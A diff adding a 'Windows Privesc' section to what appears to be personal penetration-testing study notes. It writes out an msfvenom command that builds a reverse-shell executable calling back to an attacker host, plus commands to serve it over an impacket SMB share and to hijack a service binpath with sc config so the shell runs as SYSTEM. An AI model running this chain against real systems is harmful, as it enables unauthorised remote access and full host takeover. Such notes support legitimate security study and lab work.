@@ -256,6 +256,50 @@ It is an hierarchical database used to store information necessary to configure 
   ![image](https://github.com/user-attachments/assets/12c25d18-9c07-453e-af44-40c365808f5e)
 
 
+### Windows Privesc
+
+- Connecting to rdps with `xfreerdp`
+
+      xfreerdp /u:<user> /p:<password> /cert:ignore /v:<host>
+
+### Generating and sending  revshells
+
+- Generating a windows reverse shell executable
+
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your ip> LPORT=<listening port> -f exe -o saucy.exe
+
+- Setting up an smb server with python impacket
+
+      python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+- Copy to the machine
+
+      copy \\<your ip>\kali\<filename> <folder to send to>
+
+
+### Abusing User's permissions
+
+- To check a user's permission,use `accesschk.exe`
+
+      accesschk.exe /accepteula -uwcqv user <service>
+
+![image](https://github.com/user-attachments/assets/4b9a5bc3-af80-4f15-b6be-82f5b9be749c)
+
+- Check if a binary runs with SYSTEM privileges
+
+      sc qc [service name]
+- Modify the config path to our reverseshell's path
+
+      sc config [service name] binpath="\"<reverseshell path>\""
+
+- Then net start `service name` to trigger it
+
+![image](https://github.com/user-attachments/assets/1fa7dbed-e1de-4aa8-9bdb-44ded59ec6a2)
+
+
+
+  
+
 
 
 
